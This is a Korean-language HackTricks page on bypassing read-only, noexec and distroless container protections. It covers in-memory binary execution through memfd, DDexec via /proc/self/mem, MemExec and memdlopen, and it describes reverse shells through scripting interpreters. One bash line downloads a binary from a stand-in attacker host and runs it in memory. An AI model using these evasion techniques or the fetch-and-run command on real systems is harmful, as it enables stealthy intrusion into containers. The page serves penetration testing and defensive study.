# FS 보호 우회: 읽기 전용 / 실행 불가 / Distroless

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왑**](https://peass.creator-spring.com)을 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

## 동영상

다음 동영상에서는 이 페이지에서 언급된 기술에 대해 더 자세히 설명된 내용을 찾을 수 있습니다:

* [**DEF CON 31 - 은밀하고 회피를 위한 Linux 메모리 조작 탐색**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**DDexec-ng 및 인메모리 dlopen()을 사용한 은밀한 침입 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## 읽기 전용 / 실행 불가 시나리오

리눅스 머신에서 **읽기 전용 (ro) 파일 시스템 보호**가 특히 컨테이너에서는 점점 더 일반적으로 사용됩니다. 이는 `securitycontext`에서 **`readOnlyRootFilesystem: true`**를 설정하는 것만으로도 읽기 전용 파일 시스템으로 컨테이너를 실행하는 것이 매우 쉽기 때문입니다:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

그러나 파일 시스템이 읽기 전용으로 마운트되어 있더라도 **`/dev/shm`**은 여전히 쓰기 가능하므로 디스크에 아무것도 쓸 수 없는 것은 가짜입니다. 그러나 이 폴더는 **실행 불가 보호로 마운트**됩니다. 따라서 여기에 이진 파일을 다운로드하면 **실행할 수 없습니다**.

{% hint style="warning" %}
레드 팀 관점에서는 이로 인해 시스템에 이미 없는 (백도어 또는 `kubectl`과 같은) 이진 파일을 **다운로드하고 실행하는 것이 복잡**해집니다.
{% endhint %}

## 가장 쉬운 우회: 스크립트

이진 파일을 언급했지만, **인터프리터가 머신 내부에 있는 한 스크립트**를 실행할 수 있습니다. 예를 들어, `sh`가 설치되어 있다면 **쉘 스크립트** 또는 **파이썬**이 설치되어 있다면 **파이썬 스크립트**와 같은 스크립트를 실행할 수 있습니다.

그러나 이는 이진 파일 백도어나 실행해야 할 다른 이진 도구를 실행하는 데 충분하지 않습니다.

## 메모리 우회

파일 시스템에서 이를 허용하지 않더라도 이진 파일을 실행하려면 **메모리에서 실행**하는 것이 가장 좋은 방법입니다. 왜냐하면 **보호 기능이 적용되지 않기 때문**입니다.

### FD + exec 시스콜 우회

**Python**, **Perl**, 또는 **Ruby**와 같은 강력한 스크립트 엔진이 머신 내부에 있는 경우, 이진 파일을 메모리에서 실행하기 위해 메모리 파일 디스크립터 (`create_memfd` 시스콜)에 저장한 다음 **`exec` 시스콜**을 호출하여 **fd를 실행할 파일로 지정**할 수 있습니다.

이를 위해 [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) 프로젝트를 쉽게 사용할 수 있습니다. 여기에 이진 파일을 전달하면 **이진 파일을 압축하고 b64로 인코딩**한 스크립트가 지정된 언어로 생성되며, `create_memfd` 시스콜을 호출하여 생성된 **fd**에 이진 파일을 **디코딩하고 압축 해제**하는 지침과 **exec** 시스콜을 호출하여 실행하는 지침이 포함됩니다.

{% hint style="warning" %}
PHP 또는 Node와 같은 다른 스크립팅 언어에서는 스크립트에서 **raw syscalls를 호출하는 기본 방법이 없기** 때문에 `create_memfd`를 호출하여 **메모리 fd**를 생성하는 것이 불가능하므로 이 방법은 작동하지 않습니다.

또한 `/dev/shm`의 파일을 가진 **일반적인 fd**를 생성해도 실행할 수 없습니다. 왜냐하면 **실행 불가 보호**가 적용되기 때문입니다.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec)는 **`/proc/self/mem`**을 덮어쓰는 것으로 **자체 프로세스의 메모리를 수정**할 수 있는 기술입니다.

따라서 프로세스에서 실행되는 어셈블리 코드를 **제어**하여 **쉘코드**를 작성하고 프로세스를 **임의의 코드를 실행**하도록 "변이"시킬 수 있습니다.

{% hint style="success" %}
**DDexec / EverythingExec**를 사용하면 **메모리**에서 자체 **쉘코드** 또는 **임의의 이진 파일**을 **로드하고 실행**할 수 있습니다.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
더 많은 정보를 원한다면 Github를 확인하거나 다음을 참조하세요:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec)는 DDexec의 자연스러운 다음 단계입니다. 이는 **DDexec 쉘코드를 데몬화**한 것으로, 다른 이진 파일을 실행하려면 DDexec를 다시 시작할 필요가 없으며, DDexec 기술을 통해 memexec 쉘코드를 실행한 다음 **이 데몬과 통신하여 새로운 이진 파일을 로드하고 실행**할 수 있습니다.

[https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php)에서 **memexec를 사용하여 PHP 역쉘에서 이진 파일을 실행하는 예제**를 찾을 수 있습니다.

### Memdlopen

DDexec와 비슷한 목적을 가진 [**memdlopen**](https://github.com/arget13/memdlopen) 기술은 **메모리에 이진 파일을 로드하는 더 쉬운 방법**을 제공하여 나중에 실행할 수 있습니다. 이는 종속성을 가진 이진 파일을 로드할 수도 있습니다.

## Distroless 우회

### Distroless란?

Distroless 컨테이너는 라이브러리와 런타임 종속성과 같은 **특정 애플리케이션 또는 서비스를 실행하는 데 필요한 최소한의 구성 요소만 포함**하며, 패키지 관리자, 쉘 또는 시스템 유틸리티와 같은 큰 구성 요소는 제외됩니다.

Distroless 컨테이너의 목표는 **불필요한 구성 요소를 제거함으로써 컨테이너의 공격 표면을 줄이고 악용될 수 있는 취약점의 수를 최소화**하는 것입니다.

### 역쉘

Distroless 컨테이너에서는 일반적인 쉘을 얻기 위해 **`sh` 또는 `bash`**를 찾을 수 없을 수도 있습니다. 또한 시스템에서 일반적으로 실행하는 `ls`, `whoami`, `id`와 같은 이진 파일도 찾을 수 없습니다.

{% hint style="warning" %}
따라서, 일반적으로 시스템을 **열거**하거나 **역쉘**을 얻을 수 없습니다.
{% endhint %}

그러나, 감염된 컨테이너가 예를 들어 flask 웹을 실행하고 있다면 python이 설치되어 있으므로 **Python 역쉘**을 얻을 수 있습니다. node가 실행 중이면 Node 역쉘을 얻을 수 있으며, 대부분의 **스크립팅 언어**도 마찬가지입니다.

{% hint style="success" %}
스크립팅 언어를 사용하면 언어의 기능을 사용하여 시스템을 **열거**할 수 있습니다.
{% endhint %}

**읽기 전용/실행 불가능** 보호 기능이 없다면 역쉘을 악용하여 이진 파일을 파일 시스템에 **작성**하고 **실행**할 수 있습니다.

{% hint style="success" %}
그러나 이러한 종류의 컨테이너에서는 일반적으로 이러한 보호 기능이 존재하지만, **이전의 메모리 실행 기술을 사용하여 우회**할 수 있습니다.
{% endhint %}

[**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE)에서 **일부 RCE 취약점을 악용하여 스크립팅 언어의 역쉘을 얻고 메모리에서 이진 파일을 실행하는 방법에 대한 예제**를 찾을 수 있습니다.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 **자신의 해킹 기법을 공유**하세요.

</details>
